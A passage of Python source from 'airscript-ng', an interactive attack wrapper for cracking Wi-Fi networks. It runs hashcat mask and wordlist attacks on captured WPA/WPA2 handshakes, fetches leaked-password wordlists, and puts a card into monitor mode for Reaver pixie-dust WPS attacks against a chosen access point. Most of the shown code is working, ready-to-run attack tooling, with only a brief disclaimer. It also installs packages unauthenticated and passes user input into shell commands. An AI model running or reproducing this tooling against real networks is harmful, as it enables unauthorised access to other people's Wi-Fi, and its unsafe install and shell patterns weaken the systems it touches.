                        input("\nPlease locate and click inside the \033[1;33;48mHashcat-utils\033[0;39;48m directory. Remember to click inside and press ok! (press enter) \033[1;31;48m~# \033[0;39;48m")
                        hcatutilspath = filedialog.askdirectory()
                        hcatutilspath = str(hcatutilspath)
                        #PROVIDE OPTIONS TO VIEW KEYSPACE TABLE HERE
                        if os.system("ls ~/.airscriptNG/ >/dev/null") != 0:
                            os.system("mkdir ~/.airscriptNG/ 2>/dev/null")
                        if os.system("ls ~/.airscriptNG/Dependencies-for-Airscript-ng/router-keyspaces.txt >/dev/null 2>/dev/null") != 0:
                            os.system("cd ~/.airscriptNG/ && git clone https://github.com/Sh3llcod3/Dependencies-for-Airscript-ng.git")
                        while True:
                            os.system("clear")
                            print("\n\033[1;33;48mTo brute-force the keyspace, you need to enter a mask/charset.\033[1;39;48m")
                            print("\n\033[1;34;48mType [1] - I understand what a hashcat mask/charset is and want to proceed.")
                            print("\033[1;35;48mType [2] - What is a mask/charset? How do I enter one? View documentation.")
                            readchoices = input("\n\033[0;39;48mEnter choice \033[1;31;48m~# \033[0;39;48m")
                            if readchoices == "1":
                                break
                            if readchoices == "2":
                                os.system("cat ~/.airscriptNG/Dependencies-for-Airscript-ng/router-keyspaces.txt | less")
                                continue
                        while True:
                            os.system("clear")
                            print("""
    - [ Built-in Charsets ] -

      ? | Charset
     ===+=========
      l | abcdefghijklmnopqrstuvwxyz
      u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
      d | 0123456789
      h | 0123456789abcdef
      H | 0123456789ABCDEF
      s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
      a | ?l?u?d?s
      b | 0x00 - 0xff

    """)
                            print("This is a very \033[1;31;48mcrucial\033[0;39;48m step. If you are confused, type [help] to view the documentation again.")
                            global mainhashmask 
                            mainhashmask = input("\nPlease enter a \033[1;33;48mMask/Charset.\033[0;39;48m For example:\033[1;32;48m?u?u?u?u?u?u?u?u\033[0;39;48m or \033[1;32;48mABCD?u?u?u?u\033[0;39;48m \033[1;31;48m~# \033[0;39;48m")
                            if mainhashmask.lower().startswith("help"):
                                os.system("cat ~/.airscriptNG/Dependencies-for-Airscript-ng/router-keyspaces.txt | less")
                                continue
                            if mainhashmask != "":
                                break
                            else:
                                continue
                        while True:
                            retaingputemp = input("What temperature do you want to retain? (degress celsius) \033[1;31;48m~# \033[0;39;48m")
                            maxgputemp = input("What should be the cutoff/maximum temperature limit? (degress celsius) \033[1;31;48m~# \033[0;39;48m")
                            retaingputemp = int(retaingputemp)
                            maxgputemp = int(maxgputemp)
                            if retaingputemp < 80 and maxgputemp < 85:
                                retaingputemp = str(retaingputemp)
                                maxgputemp = str(maxgputemp)
                                break
                            else:
                                retaingputemp = str(retaingputemp)
                                maxgputemp = str(maxgputemp)
                                print("\n\033[1;31;48mTemperature value inappropriate! Please input proper and safe values.\033[0;39;48m [\033[1;32;48m<80c for retain \033[0;39;48m and \033[1;32;48m<85c for max\033[0;39;48m]")
                                continue
                        hfinal()
                        print("[\033[1;32;48mINPUT MASK/CHARSET\033[1;39;48m]: %s" %(mainhashmask))
                        if os.system("ls ~/.airscriptNG/ >/dev/null") != 0:
                            os.system("mkdir ~/.airscriptNG/ 2>/dev/null")
                        if input("\n\033[0;39;48mOptions correctly chosen? Start cracking? [y/n] \033[1;31;48m~# \033[0;39;48m").lower().startswith("y"):
                            if os.system("ls ~/.airscriptNG/HANDSHAKEFILE >/dev/null 2>/dev/null") != 0:
                                os.system("touch ~/.airscriptNG/HANDSHAKEFILE")
                            os.system("cd %s/src/ && ./cap2hccapx.bin %s ~/.airscriptNG/HANDSHAKEFILE && cd %s/ && ./hashcat64.bin -a 3 -m 2500 ~/.airscriptNG/HANDSHAKEFILE %s --gpu-temp-retain=%s --gpu-temp-abort=%s -D 2 && echo '\n\nHere is any cracked hashes:' && cat %s/hashcat.potfile && echo '\n'" %(hcatutilspath,gpucrack,hcatpath,mainhashmask,retaingputemp,maxgputemp,hcatpath))
                            os.system("rm ~/.airscriptNG/HANDSHAKEFILE 2>/dev/null")
                            os.system("rm -r ~/.airscriptNG/Dependencies-for-Airscript-ng/ 2>/dev/null")
                            os.system("rm %s/hashcat.potfile %s/hashcat.log" %(hcatpath,hcatpath))
                            os._exit(1)
                        #End here
                        hfinal()
                    elif critchoice == "3":
                        ackmode = "Built-in wordlist"
                        mainwordlist = str(mainwordlist)
                        input("\nPlease locate and click inside the \033[1;33;48mHashcat-utils\033[0;39;48m directory. Remember to click inside and press ok! (press enter) \033[1;31;48m~# \033[0;39;48m")
                        hcatutilspath = filedialog.askdirectory()
                        hcatutilspath = str(hcatutilspath)
                        while True:
                            os.system("clear")
                            print("\n\033[1;33;48mPlease choose a built-in wordlist: \033[1;39;48m")
                            print("\n\033[1;32;48mType [1] \033[1;39;48m- Rockyou.txt ~15 Million lines, Skull security")
                            print("\033[1;32;48mType [2] \033[1;39;48m- Phpbb.txt, Skull security")
                            print("\033[1;32;48mType [3] \033[1;39;48m- Top 1350~ WPA/WPA2 list, from me")
                            readwordlist = input("\n\033[0;39;48mEnter choice \033[1;31;48m~# \033[0;39;48m")
                            global onlinelist
                            if os.system("ls ~/.airscriptNG/Wordlists/ >/dev/null 2>/dev/null") != 0:
                                    os.system("mkdir ~/.airscriptNG/Wordlists/")
                            if readwordlist == "1":
                                if os.system("ls ~/.airscriptNG/Wordlists/rockyou.txt.bz2 2>/dev/null >/dev/null") != 0 and os.system("ls ~/.airscriptNG/Wordlists/rockyou.txt 2>/dev/null >/dev/null") != 0:
                                    os.system("cd ~/.airscriptNG/Wordlists/ && wget http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2 && bzip2 -d rockyou.txt.bz2")
                                onlinelist = "~/.airscriptNG/Wordlists/rockyou.txt"
                                break
                            elif readwordlist == "2":
                                if os.system("ls ~/.airscriptNG/Wordlists/phpbb.txt.bz2 2>/dev/null >/dev/null") != 0 and os.system("ls ~/.airscriptNG/Wordlists/phpbb.txt 2>/dev/null >/dev/null") != 0:
                                    os.system("cd ~/.airscriptNG/Wordlists/ && wget http://downloads.skullsecurity.org/passwords/phpbb.txt.bz2 && bzip2 -d phpbb.txt.bz2")
                                onlinelist = "~/.airscriptNG/Wordlists/phpbb.txt"
                                break
                            elif readwordlist == "3":
                                if os.system("ls ~/.airscriptNG/Dependencies-for-Airscript-ng/ 2>/dev/null >/dev/null"):
                                    os.system("cd ~/.airscriptNG/ && git clone https://github.com/Sh3llcod3/Dependencies-for-Airscript-ng.git")
                                onlinelist = "~/.airscriptNG/Dependencies-for-Airscript-ng/Small-wpa-list"
                                break
                            else:
                                continue
                        mainwordlist = str(onlinelist)
                        while True:
                            retaingputemp = input("What temperature do you want to retain? (degress celsius) \033[1;31;48m~# \033[0;39;48m")
                            maxgputemp = input("What should be the cutoff/maximum temperature limit? (degress celsius) \033[1;31;48m~# \033[0;39;48m")
                            retaingputemp = int(retaingputemp)
                            maxgputemp = int(maxgputemp)
                            if retaingputemp < 80 and maxgputemp < 85:
                                retaingputemp = str(retaingputemp)
                                maxgputemp = str(maxgputemp)
                                break
                            else:
                                retaingputemp = str(retaingputemp)
                                maxgputemp = str(maxgputemp)
                                print("\n\033[1;31;48mTemperature value inappropriate! Please input proper and safe values.\033[0;39;48m [\033[1;32;48m<80c for retain \033[0;39;48m and \033[1;32;48m<85c for max\033[0;39;48m]")
                                continue
                        hfinal()
                        if input("\n\033[0;39;48mOptions correctly chosen? Start cracking? [y/n] \033[1;31;48m~# \033[0;39;48m").lower().startswith("y"):
                            if os.system("ls ~/.airscriptNG/HANDSHAKEFILE >/dev/null 2>/dev/null") != 0:
                                os.system("touch ~/.airscriptNG/HANDSHAKEFILE")
                            os.system("cd %s/src/ && ./cap2hccapx.bin %s ~/.airscriptNG/HANDSHAKEFILE && cd %s/ && ./hashcat64.bin -a 0 -m 2500 ~/.airscriptNG/HANDSHAKEFILE %s --gpu-temp-retain=%s --gpu-temp-abort=%s -D 2 && echo '\n\nHere is any cracked hashes:' && cat %s/hashcat.potfile && echo '\n'" %(hcatutilspath,gpucrack,hcatpath,mainwordlist,retaingputemp,maxgputemp,hcatpath))
                            os.system("rm ~/.airscriptNG/HANDSHAKEFILE 2>/dev/null")
                            os.system("rm -r ~/.airscriptNG/Dependencies-for-Airscript-ng/ 2>/dev/null")
                            os.system("rm %s/hashcat.potfile %s/hashcat.log" %(hcatpath,hcatpath))
                            os._exit(1)
                        hfinal()
                    elif critchoice == "99":
                        title()
                    else:
                        hcatfunc()
            hcatfunc()
            #FINISH THIS PART 
        elif cpugpu == "99":
            title()
        else:
            handshake_func()
    except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError,ValueError):
        import os
        os.system("clear")
        os._exit(1)
    #Finish here
    #WILL BE THE GO-TO PLACE TO CRACK AN EXISTING WPA/WPA2 HANDSHAKE, OPTIONS FOR USE WITH AIRCRACK, HASHCAT, GENPMK, COWPAWTTY, AIROLIB-NG MUST BE SUPPORTED!
def unaliasfunc(): #FIXES APPLIED, WITH SOME SACIFICE, REVIEW FINAL CODE.
    print("\n\033[1;34;48mScrewed up terminal in some unusual way?")
    def helpme():
        import os
        global unfunc
        unfunc = input("\n\033[1;35;48m|MENU|REMOVE_ALIAS|We gotcha' covered! remove commands from system? [y/n] >>")
        if unfunc == "":
            os.system('clear')
            helpme()
        elif unfunc.lower().startswith("n"):
            title()
        elif unfunc.lower().startswith("y"):
            if os.system("ls ~/.airscriptNG/bash_backup/bashrc-* 2>/dev/null >/dev/null") == 0:
                os.system("clear")
                print("\n")
                os.system("echo Backup file found from $(ls ~/.airscriptNG/bash_backup/ | sort | awk -F '-' {'print $2'})")
                if input("\033[0;39;48mRestore? [y/n] >>").lower().startswith("y"):
                    print("\n\033[1;32;48m[+]Restoring bash resource!\033[0;39;48m")
                    if os.system("cp ~/.airscriptNG/bash_backup/bashrc-* ~/.bash_aliases && /bin/bash -c \"source ~/.bashrc\" 2>/dev/null") == 0:
                        print("\033[1;32;48m[+]Restored successfully!\033[0;39;48m\n")
                        os._exit(1)
                    else:
                        input("\n\033[1;31;48m[-]Problems occured. Press enter to return to menu\033[0;39;48m >>")
                        title()
                else:
                    os.system("clear")
                    title()
            else:
                def bork():
                    print("\nNo Backup file found!")
                    print("If terminal is borked type 'reset' ")
                    print("If still having problems, just remove any aliases at the end of ~/.bash_aliases file to do with 'airscript-ng'!")
                    if input("\n\nType [ok] to return to menu >>").lower().startswith("ok"):
                        title()
                    else:
                        os.system("clear")
                        bork()
                bork()
    helpme()
def driverdownloadfunc(): #DOWNLOADS THE DRIVERS FROM BROWSER
    import webbrowser, os
    def funtimes():
        print("""\033[0;33;48m

 ██████╗ ██████╗ ███████╗███╗   ██╗ ██████╗██╗         ██████╗ ██████╗ ██╗██╗   ██╗███████╗██████╗ ███████╗
██╔═══██╗██╔══██╗██╔════╝████╗  ██║██╔════╝██║         ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔══██╗██╔════╝
██║   ██║██████╔╝█████╗  ██╔██╗ ██║██║     ██║         ██║  ██║██████╔╝██║██║   ██║█████╗  ██████╔╝███████╗
██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║██║     ██║         ██║  ██║██╔══██╗██║╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║
╚██████╔╝██║     ███████╗██║ ╚████║╚██████╗███████╗    ██████╔╝██║  ██║██║ ╚████╔╝ ███████╗██║  ██║███████║
 ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝
                                                                                                           
\033[0;39;48m""")
        global gpufun
        gpufun = input("|MENU|POST_CRACK|GPU|DRIVER_DOWNLOAD|(Do you have an Nvidia GPU or AMD GPU? [a/n]) \033[1;31;48m~# \033[0;39;48m")
        if gpufun.lower().startswith("n"):
            os.system("clear")
            print("A browser page will open, download the newest drivers from the archive.")
            webbrowser.open('http://www.nvidia.com/object/linux-amd64-display-archive.html')
            print("Once you have downloaded your driver of choice, Install it using the menu option (Re-run the program).")
            os._exit(1)
        elif gpufun.lower().startswith("a"):
            os.system("clear")
            print("A browser page will open, choose your drivers from there.")
            webbrowser.open('http://support.amd.com/en-us/download')
            print("Once you have downloaded your driver of choice, Install it using the menu option (Re-run the program).")
            os._exit(1)
    funtimes()   
def hashcatdownloadfunc(): #GIT CLONES AND MAKE-BUILDs HASHCAT!
    import os, webbrowser, time
    from tkinter import filedialog
    from tkinter import Tk
    os.system("clear")
    print("""\033[0;33;48m
    
              a          a
             aaa        aaa
            aaaaaaaaaaaaaaaa
           aaaaaaaaaaaaaaaaaa
          aaaaafaaaaaaafaaaaaa
          aaaaaaaaaaaaaaaaaaaa
           aaaaaaaaaaaaaaaaaa
            aaaaaaa  aaaaaaa
             aaaaaaaaaaaaaa
  a         aaaaaaaaaaaaaaaa
 aaa       aaaaaaaaaaaaaaaaaa
 aaa      aaaaaaaaaaaaaaaaaaaa
 aaa     aaaaaaaaaaaaaaaaaaaaaa
 aaa    aaaaaaaaaaaaaaaaaaaaaaaa
  aaa   aaaaaaaaaaaaaaaaaaaaaaaa
  aaa   aaaaaaaaaaaaaaaaaaaaaaaa
  aaa    aaaaaaaaaaaaaaaaaaaaaa
   aaa    aaaaaaaaaaaaaaaaaaaa
    aaaaaaaaaaaaaaaaaaaaaaaaaa
     aaaaaaaaaaaaaaaaaaaaaaaaa

██╗  ██╗ █████╗ ███████╗██╗  ██╗ ██████╗ █████╗ ████████╗    
██║  ██║██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗╚══██╔══╝       
███████║███████║███████╗███████║██║     ███████║   ██║       
██╔══██║██╔══██║╚════██║██╔══██║██║     ██╔══██║   ██║       
██║  ██║██║  ██║███████║██║  ██║╚██████╗██║  ██║   ██║       
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝                                                                   
\033[0;39;48m
""")
    if input("\033[1;39;48mDownload and setup hashcat for GPU-WPA cracking? [y/n] >> ").lower().startswith("y"):
        os.system("clear")
        print("\nWhere would you like hashcat installed?")
        input("\n|MENU|POST_CRACK|GPU|HASHCAT_DOWNLOAD|(Please delete any older versions and press enter to choose directory) >>")
        global hashpath
        Tk().withdraw()
        hashpath = filedialog.askdirectory()
        hashpath = str(hashpath)
        print("\nA browser window will now open. ALT+TAB back to the terminal")
        time.sleep(3)
        webbrowser.open("https://hashcat.net/")
        #print("Please right-click and copy/paste link location on the button next to hashcat binaries")
        downloadpath = input("\nPlease paste the URL/ADDRESS/LINK-LOCATION of the hashcat binaries download button EG:https://hashcat.net/files/hashcat-3.6.0.7z \033[1;31;48m~# \033[0;39;48m")
        os.system("sudo apt install p7zip p7zip-full -y;cd %s;wget %s;7z x hashcat-*;git clone https://github.com/hashcat/hashcat-utils.git;cd hashcat-utils/src/;make" %(hashpath, downloadpath))
        #os.system("cd %s;git clone https://github.com/hashcat/hashcat.git;cd hashcat/;git submodule update --init;make;cd ..;git clone https://github.com/hashcat/hashcat-utils.git;cd hashcat-utils/src/;make" %(hashpath))
        os.system("\necho '\033[1;32;48m[+] \033[1;39;48mHashcat is now ready to use, it will be inside the folder you chose \033[0;39;48m' ")
        os._exit(1)
    else:
        title()
def drifunc(): #Installs downloaded drivers
    import os
    from tkinter.filedialog import askopenfilename, Tk as snak
    snak().withdraw()
    def Nvidia():
        os.system("clear")
        global nvenc
        path = input("Please select where the NVIDIA driver file is located. Press enter (you may have to answer yes to some options) \033[1;31;48m~# \033[0;39;48m")
        nvenc = askopenfilename()
        nvenc = str(nvenc)
        os.system("clear")
        input("\n|MENU|POST_CRACK|GPU|DRIVER_INSTALL|NVIDIA|(Please remove any previous drivers/driver downloads and hit enter) \033[1;31;48m~# \033[0;39;48m")
        os.system("cd %s;sudo ./NVIDIA-Linux*" %(nvenc))
        print("echo NVIDIA driver is installed!")
        print("now reboot, if you see any error, please head to: 'https://goo.gl/f1GU1F'")
    def AMD():
        os.system("clear")
        from tkinter import filedialog
        from tkinter import Tk
        global AMDlol 
        AMDlol = input("Please select the folder where the AMD driver tar.xz file is located. Press enter \033[1;31;48m~# \033[0;39;48m")
        AMDlol = filedialog.askdirectory()
        AMDlol = str(AMDlol)
        os.system("clear")
        input("\n|MENU|POST_CRACK|GPU|DRIVER_INSTALL|AMD|(Please remove any previous drivers/driver downloads and hit enter) \033[1;31;48m~# \033[0;39;48m")
        os.system("cd %s;tar -Jxvf amdgpu-pro*;cd amdgpu-pro*;./amdgpu-pro-install -y" %(AMDlol))
        print("echo AMD driver is installed!")
        print("now reboot, if you see any error, type: 'amdgpu-pro-uninstall' and reboot.")
    print("""

██╗███╗   ██╗███████╗████████╗ █████╗ ██╗     ██╗         ██████╗ ██████╗ ██╗██╗   ██╗███████╗██████╗ ███████╗
██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║     ██║         ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔══██╗██╔════╝
██║██╔██╗ ██║███████╗   ██║   ███████║██║     ██║         ██║  ██║██████╔╝██║██║   ██║█████╗  ██████╔╝███████╗
██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║     ██║         ██║  ██║██╔══██╗██║╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║
██║██║ ╚████║███████║   ██║   ██║  ██║███████╗███████╗    ██████╔╝██║  ██║██║ ╚████╔╝ ███████╗██║  ██║███████║
╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝
                                                                                                              

""")
    print("This is the driver installation screen. Your options are:")
    print("\n\n\033[1;35;48mType [1] - Install the NVIDIA-LINUX driver for Hashcat (NVIDIA GTX 900,10 Series)")
    print("\033[1;34;48mType [2] - Install the AMDGPU-PRO driver to use Hashcat with an AMD gpu (MOST GPUs, check hashcat.net)")
    sel = input("\n|MENU|POST_CRACK|GPU|DRIVER_INSTALL|(Type number) >>")
    if sel == "":
        drifunc()
    if sel == "1":
        Nvidia()
    if sel == "2":
        AMD()
def aliasfunc(): #FIXES APPLIED, WITH SOME SACIFICE, REVIEW FINAL CODE.
    import os
    os.system("clear")
    if input("\033[1;37;48m\n\nAdd Airscript-ng commands to system? (append alias to ~/.bash_aliases)? \033[1;35;48m[y/n] >").lower().startswith("y"):
        os.system('clear')
        if os.system("ls .airscriptNG/bash_backup/ 2>/dev/null >/dev/null") != 0:
            if os.system("mkdir -p ~/.airscriptNG/bash_backup/ 2>/dev/null") == 0:
                if os.system("ls ~/.bash_aliases 2>/dev/null >/dev/null") == 0:
                    if os.system("ls ~/.airscriptNG/bash_backup/bashrc-* 2>/dev/null >/dev/null") != 0:
                        os.system("cp ~/.bash_aliases ~/.airscriptNG/bash_backup/bashrc-$(date | awk -F ' ' {'print $1,$2,$3,$6'} | tr -d '[:space:]' | sort) 2>/dev/null ")
                else:
                    pass
        print("\033[1;34;48m\n\nPlease choose location of where you have the airscript-ng.py file. ")
        print("\033[1;31;48mplease note though that removing or modifying the script could result in disaster. Use the remove_alias option before doing so!")
        input("\033[1;33;48m\n|MENU|INSTALL_ALIAS|Press enter to continue >>\033[0;39;48m")
        from tkinter.filedialog import askopenfilename, Tk as pwned
        pwned().withdraw()
        global zcat
        zcat = askopenfilename()
        zcat = str(zcat)
        os.system("echo \"alias airscript-ng='python3 %s'\" >> ~/.bash_aliases && /bin/bash -c \"source ~/.bashrc\" " %(zcat))
        print("\n\033[1;32;48mAlias has been successfully added to ~/.bash_aliases.\033[0;39;48m")
        print("Invoke this script from anywhere by typing \"airscript-ng\" \n")
        os._exit(1)
    else:
        os.system("clear")
        title()
def depandancies(): #This is fine 
    import os,time
    print("\033[1;33;48m[-] \033[0;37;48mUpdating system and installing some dependancies. Please hold!")
    os.system("echo '\033[1;32;48m[-] \033[0;37;48m25% done';sudo apt update --allow-unauthenticated 2>/dev/null && echo '\033[1;32;48m[-] \033[0;37;48m50% done' && sudo apt install xterm -y --allow-unauthenticated >/dev/null 2>/dev/null")
    os.system("xterm $HOLD -title 'Installing any dependancies [airscript-ng]'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'sudo apt install gawk reaver aircrack-ng wireless-tools ethtool apt-transport-https iproute2 git isc-dhcp-server python3-tk driftnet dsniff bzip2 -y --allow-unauthenticated && update-rc.d isc-dhcp-server disable'")
    time.sleep(2)
def check_depends(): #Still works
    import os,time
    x = os.system("dpkg -s xterm gawk reaver aircrack-ng wireless-tools ethtool apt-transport-https iproute2 git isc-dhcp-server python3-tk dsniff driftnet bzip2 2>/dev/null >/dev/null")
    if x == 0:
        pass
    else:
        depandancies()
    #array = ["xterm","gawk","reaver","aircrack-ng","wireless-tools","ethtool","apt-transport-https","iproute2","git","isc-dhcp-server","python3-tk","dsniff","driftnet"]
    #for i in array[0:len(array)]:
    #    x = os.system("dpkg -s %s 2>/dev/null > /dev/null" %(i))
    #    if x == 0:
    #        pass
    #    else:
    #        depandancies()
def clearScreen(): #This is fine too but devise not defined fix
    import os
    dcl = input("\033[1;34;48m[i] \033[1;37;48mPress 'y' to perform cleanup or 'clear' to clean out residual files >>")
    if dcl.lower().startswith("y"):
        print("\n\033[1;34;48m[info] \033[0;37;48mWait a few seconds, cleaning up...")
        os.system("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index))
        os.system("sudo systemctl start NetworkManager.service")
        os.system("sudo systemctl start wpa_supplicant.service")
        os.system("clear")
        if input("\n\033[1;37;48m[-] \033[0;38;48mPress [y] to exit or any other key to return to start>>").lower().startswith("y"):
            os.system("rm log.txt 2>/dev/null")
            os._exit(1)
        else:
            os.system("clear")
            title()
            os.system("rm log.txt 2>/dev/null")
    if dcl.lower().startswith("clear"):
        os.system("rm ~/.airscriptNG/ -rf 2>/dev/null >/dev/null")
        input("\n\nDone. Hit enter ~# ")
        print("\n\033[1;34;48m[info] \033[0;37;48mWait a few seconds, cleaning up...")
        os.system("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index))
        os.system("sudo systemctl start NetworkManager.service")
        os.system("sudo systemctl start wpa_supplicant.service")
        os.system("clear")
        title()
    else:
        clearScreen()
def revert(): #revert repos is fine until apt-add solution is devised
    import os
    if os.system("ls -a backup-repos >> log.txt") == 0:
        os.system("sudo cp backup-repos/sources.list /etc/apt/sources.list")
        print("Successfully reverted repo back to what it was!")
        os.system("sudo apt update")
        print("If you don't see errors above then SOURCES file is ok.")
        clearScreen()
    else:
        print("Backup file not found!")
        clearScreen()
def install_deps(): #Needs a little bit of work
    import os
    os.system("clear")
    print("\033[1;32;48m[+] \033[1;35;48mThis option will append a few lines to your '/etc/apt/sources.list' file.")
    print("\033[1;34;48m[info] \033[1;37;48mAfter this the program will update the apt repos and install the dependancies")
    print("\033[1;37;48m[-] \033[1;33;48mPlease, Please remember that adding additional repos to debian is not advised.Since we'll only be adding the Kali-Rolling Repos, You should be fine! Do not run this on a KALI system!")
    tf = input("\033[1;33;48m[?] \033[0;37;48mPress [y] to proceed or CTRL+C to exit. >>")
    if tf.lower().startswith("y"):
        if os.system("iwconfig monitor 2>/dev/null") == 0:
            os.system("iw dev monitor del")
        else:
            pass
        if os.system("ls -a /etc/apt/sources.list >> log.txt") == 0:
            if os.system("ls -a backup-repos >> log.txt 2>/dev/null") !=0:   
                os.system("sudo mkdir backup-repos;cd backup-repos;cp /etc/apt/sources.list ./")
                com = os.system("sudo echo '#This line was added by airscript-ng, remove the line below if problems occur' >> /etc/apt/sources.list") 
                sou = os.system("sudo echo 'deb http://http.kali.org/kali kali-rolling main non-free contrib #By AIRSCRIPT-NG' >> /etc/apt/sources.list") 
                if com == 0 and sou == 0:
                    print("\033[1;32;48m[+] \033[1;35;48mAPT sources successfully added. If any problems occur remove last line from '/etc/apt/sources.list' file.")
                    depandancies()
                    print("Dependancies successfully installed! If you see errors above remove last line from '/etc/apt/sources.list' file, or use option 4 from the main-menu.")
                    clearScreen()
                else:
                    print("Problems occured when trying to add the repos, reverting to old repo.")
                    if input("Revert? y/n >>").lower().startswith("y"):
                        revert()
                    else:
                        clearScreen()
            else:
                print("Looks like Kali-repos have already been added.")
                depandancies()
        else:
            print("Are you sure this is a debian-based system?")
            print("I didn't find anything for '/etc/apt/sources.list'")
            print("Either your system doesn't use APT or isn't a debian based distro.")
            print("Please try something else.")
            input()
            clearScreen()
    else:
        install_deps()
def reaver():  #Needs major overhaul
    import os, time
    try:
        os.system('clear')
        print("\033[1;32;48m[+] \033[0;36;48mThanks for chosing reaver")
        print("\033[1;37;48m[-] \033[0;33;48mPlease note that Reaver-pixie dust method only works on very few WPS access points worldwide.")
        #print("\033[1;37;48m[-] \033[0;33;48mPlease note that Reaver-pixie dust method only works on very few WPS access points worldwide. This number is dwindlling and success chances are very low. That doesn't mean its all 'Doom and Gloom' ")
        #print("\033[1;37;48m[+] \033[0;32;48mDespite the odds, when it works, it feels magical. Like the powers above sprinkled some pixie dust on your computer.")
        ack = input("\033[1;33;48m[?] \033[0;35;48mType 'y' to continue>>")
        if ack.lower().startswith('y'):
            print("\033[1;33;48m[-] \033[0;37;48mChecking for dependancies")
            print("\033[1;32;48m[-] \033[0;37;48m5% done")
            reaverspecialdeps()
            #check_depends()
            print("\033[1;33;48m[-] \033[0;35;48mAll dependancies are met. Make sure you have correct drivers! \033[0;37;48m")
            time.sleep(1)
            os.system('clear')
            print("""\033[0;36;48m

██████╗ ██╗██╗  ██╗██╗███████╗    ██████╗ ██╗   ██╗███████╗████████╗
██╔══██╗██║╚██╗██╔╝██║██╔════╝    ██╔══██╗██║   ██║██╔════╝╚══██╔══╝
██████╔╝██║ ╚███╔╝ ██║█████╗      ██║  ██║██║   ██║███████╗   ██║   
██╔═══╝ ██║ ██╔██╗ ██║██╔══╝      ██║  ██║██║   ██║╚════██║   ██║   
██║     ██║██╔╝ ██╗██║███████╗    ██████╔╝╚██████╔╝███████║   ██║   
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   


\033[1;33;48m[info] \033[0;32;48mDeveloped by Sh3llCod3, Using the reaver tool. 2017-2020. Use with legal caution, disclaimer applies.Thanks for using this program\n""")
            print("Ok lets put a Card in monitor mode\n")
            os.system("sudo systemctl stop NetworkManager.service")
            os.system("sudo systemctl stop wpa_supplicant.service")
            print("\033[1;32;48m[+] \033[0;37;48myour cards are:\n ")
            os.system("ls /sys/class/net | grep ^wl")
            print("\n")
            global index
            index = input("\033[1;33;48m[?] \033[1;35;48mWhat card shall I put in monitor-mode/use? \033[1;32;48m(copy/paste) \033[1;35;48m>> ")
            index = str(index)
            os.system("ip link set %s down;iw dev %s set type monitor;ip link set %s up" %(index,index,index))
            print("\033[1;34;48m[info] \033[0;32;48mOk, seems like %s is started, time to get crackin'" %(index))
            print("\033[1;34;48m[info] \033[0;37;48mNow we'll run wash to find all the wps networks around")
            print("\033[1;34;48m[info] \033[0;33;48mPlease press CTRL+C once you see your target network")
            z = input("\033[0;34;48m\nGot all that? Press enter >>")
            z = str(z)
            os.system("wash -i %s" %(index))
            b = input("\n\033[1;33;48m[?] \033[0;34;48mJust copy+paste the bssid of the target network [no spaces] >> ")
            b = str(b)
            c = input("\033[1;34;48m[?] \033[1;35;48mFinally tell me the channel of the target ap [look for Ch] >> ")
            c = str(c)
            os.system("clear")
            def fix():
                print("\033[1;34;48m[info] \033[1;37;48mOnce you hit enter i'll attempt to pwn the wps using Reaver + Pixie dust.")
                print("\033[1;34;48m[info] \033[1;33;48mPlease note that this can backfire and lock the AP if left for too long")
                print("\033[1;34;48m[info] \033[1;35;48mIt should work in 15secs~30secs. If you see it running for more, then cancel it with CTRL+C.Don't risk it.Try again.")
                print("\033[1;34;48m\nHow do you want to run it? \033[1;32;48m[1] \033[1;34;48mto run normally or \033[1;32;48m[2] \033[0;34;48mto fix \033[1;31;48m'FAILED TO ASSOCIATE WITH AP'\033[0;34;48m")
                opt = input("\n\033[0;33;48mChoose either 1 or 2 >>")
                if opt == "1":
                    os.system("reaver -i %s -b %s -K 1 -vvv -c %s" %(index,b,c))
                    print("\033[1;34;48m\n[info] \033[1;35;48mBy now it has either worked or not. If it hasn't, well then i'm sorry. Please use the fix/aircrack-ng approach instead or if it has then CONGRATS ON FINDING THE PSK!")        
                    clearScreen()
                if opt == "2":
                    os.system("xterm $HOLD -title 'ASSOCIATING WITH AP'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -geometry +2160 -e aireplay-ng -1 30 -a %s %s&reaver -i %s -b %s -K 1 -vvv -c %s -N -A " %(b,index,index,b,c))
                    print("\033[1;34;48m\n[info] \033[1;35;48mBy now it has either worked or not. If not then please try option [1]")
                    os.system("kill $(ps | grep xterm | awk -F ' ' {'print $1'}) 2>/dev/null ")
                    #print("\033[1;33;48m\n[info] \033[1;31;48mPlease close the Xterm at the top right now, as keeping it on is pretty much useless!")
                    clearScreen()
                else:
                    os.system("clear")
                    fix()
            fix()
        else:
            os.system('clear')
            reaver()
    except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
            print("\n\033[1;34;48m[info] \033[0;37;48mWait a few seconds, cleaning up...")
